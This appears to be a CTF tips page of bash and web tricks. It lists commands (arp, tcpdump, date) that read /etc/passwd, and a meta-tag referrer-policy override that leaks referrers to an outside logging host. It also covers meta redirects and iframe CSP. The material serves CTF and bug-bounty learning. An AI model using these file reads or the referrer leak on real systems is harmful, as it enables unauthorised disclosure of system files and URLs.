# 2020-01-01 CTF's Bytes


## BASH/MISC

### Bash Commands that can do Local read file
* arp -v -f '/etc/passwd'
* tcpdump -c 1 -vvvvvv -V '/etc/passwd'
* date '+%s' -f '/etc/passwd'
* od filename 

### Using htop/top command to seek into other process memory 

htop/top command can be used to strace a process sys calls. Steps:

1. Run htop

```bash

root@fc7e34d51219:/# htop
```

2. Goto process you need to see working of 
3. Press ‘s’ . It will show strace of the corresponding process

### The mysterious ^D(Ctrl+D)

LIke ^C , ^D is also used to Exit a program but ^D sends an EOF on standard input to exit the program while ^C uses SIGINT to exit. 

Run `perl` in interactive mode and see it in action

```bash

root@fc7e34d51219:/ctf# perl -
print(23);
print("hello??");
print("hmmm");
```
If we use ^C it will exit normally without executing any, but using ^D will execute the commands. Now it's not only with perl, many command line utilities follow same.


## WEB

### HTML - Meta tag tricks

#### Meta tags can be used to override referrer policy
```php
  
<?php 
  header("Referrer-Policy: no-referrer");
?>

<html>
  <body>
      <meta name="referrer" content="unsafe-url">
      <img src="http://zeta2.free.beeceptor.com" >
  </body>
</html>
```

The referrer policy added by PHP will be ignored. So if we have HTML-injection we can basically override referrer policy.


#### Meta tags redirect
We can use meta tags to redirect to different site

```html

<meta http-equiv="refresh" content="0;URL='http://example.com/'" />
```

### Iframe

#### CSP override using iframe

If lets say http://example.com has some CSP setting. 
Iframe has a csp attribute which allows to implement csp on the frame source.
```html
<iframe csp=“script:none” src=‘site.com’>
```
The CSP which is more strict (frame’s attribute or coming from src tag) will be chosen as CSP within iframe. More on https://w3c.github.io/webappsec-cspee/


## New Tools to improve Bug Bounty flow

* HTTP Parameter finding : https://github.com/0xsapra/fuzzparam
* Logic bugs finding : https://github.com/ngalongc/openapi_security_scanner
